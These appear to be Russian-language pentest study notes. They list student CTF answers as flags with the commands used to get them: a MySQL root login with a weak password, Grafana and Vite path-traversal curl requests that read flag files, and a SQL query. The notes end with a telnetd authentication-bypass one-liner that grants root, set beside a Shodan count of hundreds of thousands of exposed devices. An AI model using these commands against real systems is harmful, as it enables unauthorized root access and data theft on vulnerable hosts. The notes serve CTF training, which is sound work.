### Пентест
https://portswigger.net/web-security/file-upload \
https://medium.com/@nebty/my-standoff365-ctf-web-1-x-assignment-adventure-how-i-hacked-a-website-legally-of-course-a8bff200dbc3 \
https://codeby.net/threads/writeup-standoff365-infra-1-2-3.83966/ 

#### Ответы студ:
1. flag{c1259ead36165a9477c9e1948500fb1ae58f33140} (SELECT * FROM flag_data) 
2.  flag{c17c4f84232158419a8b4b298078da2a54431bc1} (mysql -h 158.160.112.68 -u root -p123456 --ssl-verify-server-cert=0) 
3. flag{b9dace6cd727a1ce9c09ea568815ac23dbab55} (curl -s "http://158.160.112.68:3000/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/flag") 
4. - 
5. (shell + ffmpeg) 
6. flag{d50ab07e11fa4bf3b1c7c3312e1d7baea} (curl "http://158.160.63.30:5173/@fs/etc/flag?import&raw??" -o flag.js) 

В telnetd начиная с версии 1.9.3 (май 2015 года) и вплоть до 2.7 (включительно) существует (https://seclists.org/oss-sec/2026/q1/89) уязвимость, которая позволяет любому подключиться от имени root, без проверки пароля.
Под ударом практически все дистрибутивы Linux, которые ставят inetutils-telnetd из репозиториев: \
— Debian / Ubuntu / Kali / Trisquel и производные \
— Многие embedded-системы, старые роутеры, IoT-устройства, промышленные контроллеры, где до сих пор жив telnet \
Shodan сейчас находит (https://www.shodan.io/search?query=product%3Atelnetd) 732,350 устройств по всему миру. 
А чтобы эксплуатировать, достаточно одной команды: \
```
$ USER="-f root" telnet -a IP PORT
```
